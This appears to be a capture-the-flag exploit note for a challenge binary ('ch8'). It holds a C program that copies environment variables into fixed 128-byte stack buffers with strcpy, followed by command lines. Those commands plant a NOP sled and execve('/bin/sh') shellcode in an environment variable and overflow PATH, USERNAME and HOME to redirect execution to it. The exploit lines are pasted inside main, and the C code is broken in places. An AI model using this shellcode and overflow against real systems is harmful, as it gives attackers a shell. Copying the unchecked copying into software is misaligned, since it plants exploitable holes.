struct EnvInfo
{
  char home[128];
  char username[128];
  char shell[128];  
  char path[128];  
};

struct EnvInfo	*GetEnv(struct EnvInfo *env)
{
	char home[128];
	char username[128];
	char shell[128];  
	char path[128];  
	char *ptr;

	if (!(ptr = getenv("HOME")))
	{
		puts("[-] Can't find HOME.");
		exit(0);
	}
	strcpy(&home, ptr);

	if (!(ptr = getenv("USERNAME")))
	{
		puts("[-] Can't find USERNAME.");
		exit(0);
	}
	strcpy(&username, ptr);

	if (!(ptr = getenv("SHELL")))
	{
		puts("[-] Can't find SHELL.");
		exit(0);
	}
	strcpy(&shell, ptr);

	if (!(ptr = getenv("PATH")))
	{
		puts("[-] Can't find PATH.");
		exit(0);
	}
	strcpy(&path, ptr);


}

int main() {
	struct EnvInfo envtmp;
	struct EnvInfo env;

	puts("[+] Getting env...");
	GetEnv(&envtmp);
	memcpy(&env, &envtmp, sizeof(struct EnvInfo));
	printf("HOME     = %s\n", env.home);
	printf("USERNAME = %s\n", env.username);
	printf("SHELL    = %s\n", env.shell);
	printf("PATH     = %s\n", env.path);

	return (0);


env PATH=`python -c "print 'a' * 160 + 'cccc'"` USERNAME=magouin HOME=`python -c "print 'b' * 92 + 'dddd'"` /usr/bin/gdb -x /tmp/.gdbinit ./ch8
export BINSH=`python -c "print '\x90' * 10000 + '\x31''\xc0''\x50''\x68''\x2f''\x2f''\x73''\x68''\x68''\x2f''\x62''\x69''\x6e''\x89''\xe3''\x89''\xc1''\x89''\xc2''\xb0''\x0b''\xcd''\x80''\x31''\xc0''\x40''\xcd''\x80'"`

adresse shellcode : 0xbfffdacb
env PATH=`python -c "print 'a' * 160 + 'cccc'"` USERNAME=magouin HOME=`python -c "print 'b' * 92 + 'dddd'"` /usr/bin/gdb -x /tmp/.gdbinit ./ch8

env PATH=`python -c "print 'a' * 160 + 'cccc'"` USERNAME=`python -c "print 'e' * 76 + 'ffff'"` HOME=`python -c "print 'b' * 108 + '\xcb''\xda''\xff''\xbf'"` /usr/bin/gdb -x /tmp/.gdbinit ./ch8

}